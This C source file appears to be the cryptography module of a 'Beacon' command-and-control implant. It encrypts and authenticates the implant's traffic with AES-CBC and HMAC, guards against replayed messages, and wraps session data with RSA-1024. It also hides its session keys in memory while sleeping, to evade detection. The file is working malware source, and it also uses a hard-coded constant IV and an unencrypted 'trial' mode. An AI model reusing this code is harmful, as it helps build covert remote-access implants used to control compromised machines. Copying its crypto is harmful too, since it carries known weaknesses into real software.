#include "security.h"
#include "tomcrypt.h"
#include "crypto.h"

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>

#include "parse.h"
#include "beacon.h"
#include "track_memory.h"

#if defined _M_X64
#pragma comment(lib, "lib/tommath.x64.lib")
#pragma comment(lib, "lib/tomcrypt.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "lib/tommath.x86.lib")
#pragma comment(lib, "lib/tomcrypt.x86.lib")
#endif

#define TOLERANCE (60 * 60)

#define CRYPTO_LICENSED_PRODUCT 0
#define CRYPTO_TRIAL_PRODUCT 1

static int cipher;
static int hash;
static short scheme;
static unsigned char key[KEY_SIZE];
static unsigned char hmac_key[KEY_SIZE];
static unsigned char iv[16];
static symmetric_CBC out_state;
static symmetric_CBC in_state;
static symmetric_key the_key;
static unsigned int lastcounter = 0;

/* swallow the first argument (a string); so it doesn't show up in our binary anymore */
#define sanity(a, b) if (b != CRYPT_OK) { exit(1); }

/* decrypt the specified stuff */
int security_decrypt(char * ciphertext, int length) {
	int check;
	char * plaintext;
	char unsigned hmac_bytes[HMAC_SIZE];
	char * hmac_sent = NULL;

	datap data;

	/* if you look closely, this is the structure of the decrypted data */
	unsigned int   counter;
	unsigned int   len;
	char *         dptr;
	unsigned long  mac_len = HMAC_SIZE;

	/* sanity check */
	if (length <= HMAC_SIZE)
		return 0;

	/* create a buffer for our plaintext */
	plaintext = (char *)malloc(length - HMAC_SIZE);

	/* another sanity check */
	if ((length % 16) != 0) {
		free(plaintext);
		return 0;
	}

	/* calculate hmac against ciphertext */
	check = hmac_memory(hash, hmac_key, KEY_SIZE, (const unsigned char *)ciphertext, length-HMAC_SIZE, hmac_bytes, &mac_len);
	sanity("hmac_calculate", check);

	/* compare calculated hmac against embedded hmac */
	hmac_sent = ciphertext + length - HMAC_SIZE;
	check = memcmp(hmac_sent, hmac_bytes, HMAC_SIZE);
	if (check != 0) {
		/* this is not a hard failure. Beacon should continue to operate
		   even when this check fails */
		free(plaintext);
		return 0;
	}

	/* truncate to work w/o the HMAC in the ciphertext */
	length -= HMAC_SIZE;

	/* handle our crypto in a product specific way */
	if (scheme == CRYPTO_LICENSED_PRODUCT) {
		/* init our decryption routines */
		check = cbc_start(cipher, iv, key, KEY_SIZE, 0, &in_state);
		sanity("decrypt/cbc_start", check);

		/* decrypt the buffer */
		check = cbc_decrypt((const unsigned char*)ciphertext, (unsigned char*)plaintext, length, &in_state);
		sanity("decrypt/cbc_decrypt", check);

		/* we're done */
		check = cbc_done(&in_state);
		sanity("decrypt/cbc_done", check);
	}
	else if (scheme == CRYPTO_TRIAL_PRODUCT) {
		memcpy(plaintext, ciphertext, length);
	}
	else {
		exit(1);
	}

	/* initialize our data parser */
	data_init(&data, plaintext, length);

	/* check our counter */
	counter = data_int(&data);
	if ((counter + TOLERANCE) <= lastcounter) {
		/* this is not a hard failure. Beacon should continue to operate
		   even when this check fails */
		free(plaintext);

		/* should let the user know, I don't want them complaining */
		post_crypt_replay_error(lastcounter - (counter + TOLERANCE));
		return 0;
	}

	/* extract and use our length */
	len = data_int(&data);
	if (len == 0 || len > (unsigned int)length) {
		/* corrupt-but-authenticated frame (only reachable on a bug or a
		 * desync). Drop the frame instead of exit(0) - a hard exit here
		 * skips safe_exit/track_memory cleanup and silently kills the
		 * session over a recoverable protocol error. */
		free(plaintext);
		return 0;
	}

	/* pull our data, we're going to use it in a moment */
	dptr = data_ptr(&data, len);
	if (dptr == NULL) {
		free(plaintext);
		return 0;
	}

	memcpy(ciphertext, dptr, len);

	/* to prevent replay attacks, let's store our last recv'd counter value */
	lastcounter = counter;

	/* cleanup our temporary memory */
	data_cleanup(&data);

	/* free our plaintext */
	free(plaintext);

	return len;
}

/* post a frame to our socket OK OK */
int security_encrypt(char * ciphertext, int length) {
	int pad, check;
	unsigned long mac_len = HMAC_SIZE;

	pad = length % 16;
	while (pad != 0 && pad < 16) {
		pad++;
		length++;
	}

	/* handle our crypto in a product specific way */
	if (scheme == CRYPTO_LICENSED_PRODUCT) {
		/* encrypt the buffer... */
		check = cbc_start(cipher, iv, key, KEY_SIZE, 0, &out_state);
		sanity("encrypt/cbc_start", check);

		check = cbc_encrypt((const unsigned char*)ciphertext, (unsigned char*)ciphertext, length, &out_state);
		sanity("encrypt/cbc_encrypt", check);

		/* we're done */
		check = cbc_done(&out_state);
		sanity("encrypt/cbc_done", check);
	}
	else if (scheme == CRYPTO_TRIAL_PRODUCT) {
		/* do nothing, apparently */
	}
	else {
		exit(1);
	}

	/* calculate hmac for the buffer */
	check = hmac_memory(hash, hmac_key, KEY_SIZE, (const unsigned char*)ciphertext, length, (unsigned char*)ciphertext+length, &mac_len);
	sanity("hmac_calculate", check);

	/* add HMAC_SIZE to length to reflect additional data */
	length = length + HMAC_SIZE;

	return length;
}

void security_init(char * k) {
	int check;
	unsigned char key_bucket[KEY_SIZE*2];
	unsigned long hash_len = HASH_SIZE;

	/* setup hash function */
	register_hash(&sha256_desc);
	hash = find_hash("sha256");

	/* hash the key to generate keymaterial */
	check = hash_memory(hash, (const unsigned char*)k, KEY_SIZE, key_bucket, &hash_len);
	sanity("crypt_derive", check);

	/* Copy keys out */
	memcpy(key, &key_bucket[0], KEY_SIZE);
	memcpy(hmac_key, &key_bucket[KEY_SIZE], KEY_SIZE);

	/* setup our IV */
	memcpy(iv, "abcdefghijklmnop", 16);

	/* setup our AES cipher */
	register_cipher(&aes_desc);
	cipher = find_cipher("aes");

	check = aes_setup(key, KEY_SIZE, 0, &the_key);
	sanity("aes_setup", check);

	/* the session key material lives in statics for the whole session.
	 * Register them with the sleep-mask walk so they are XORed while the
	 * beacon sleeps (masking only runs with zero worker threads, so no
	 * crypto operation can be in flight). STATIC = zeroed at exit, never
	 * free()d. */
	track_memory_add(key, KEY_SIZE, TRACK_MEMORY_STATIC, TRUE, NULL);
	track_memory_add(hmac_key, KEY_SIZE, TRACK_MEMORY_STATIC, TRUE, NULL);
	track_memory_add(iv, sizeof(iv), TRACK_MEMORY_STATIC, TRUE, NULL);
	track_memory_add(&out_state, sizeof(out_state), TRACK_MEMORY_STATIC, TRUE, NULL);
	track_memory_add(&in_state, sizeof(in_state), TRACK_MEMORY_STATIC, TRUE, NULL);
	track_memory_add(&the_key, sizeof(the_key), TRACK_MEMORY_STATIC, TRUE, NULL);
}

/* we're only going to do this once, better get it right
 *
 * A few notes:
 *    - kbuffer should be at least 162 bytes [RSA PubKey in OpenSSL DER format]
 *    - indata/inlen should be MAX 117 bytes [128 bytes - 11 for padding minimum]
 *    - outdata/outlen should be 128 bytes total
 */
int rsa_encrypt_once(char * kbuffer, char * indata, int inlen, char * outdata, int * outlen) {
	int check, prng_idx;
	rsa_key key;
	unsigned long outlen_tmp;

	/* which crypto scheme are we using */
	scheme = setting_short(SETTING_CRYPTO_SCHEME);

	/* 随机数源统一走 crypto 层：ProcessPrng（Win10 1809+），回退 CryptGenRandom。
	   原 LTC sprng 在 Windows 上依赖已废弃的 CryptGenRandom 路径。 */
	prng_idx = crypto_init();
	sanity("crypto_init/prng", prng_idx >= 0 ? CRYPT_OK : CRYPT_ERROR);

	/* register a math library (in this case TomsFastMath) */
	ltc_mp = ltm_desc;

	/* load our RSA-1024 key */
	check = rsa_import((const unsigned char*)kbuffer, 162, &key);
	sanity("rsa_import", check);

	/* 注意：outlen 形参是 int*，但 rsa_encrypt_key_ex 按 unsigned long*（8 字节）
	   写回。直接把 (unsigned long*)outlen 传下去会踩坏调用方栈上相邻 4 字节
	   （/GS 环境下函数返回时 0xC0000409）。经局部 8 字节中转后再写回。 */
	outlen_tmp = (unsigned long)*outlen;

	/* encrypt it */
	check = rsa_encrypt_key_ex((const unsigned char*)indata, inlen, (unsigned char*)outdata, &outlen_tmp, (const unsigned char *)"Zz", 2, NULL, prng_idx, 0, LTC_PKCS_1_V1_5, &key);
	sanity("rsa_encrypt", check);

	*outlen = (int)outlen_tmp;

	return CRYPT_OK;
}
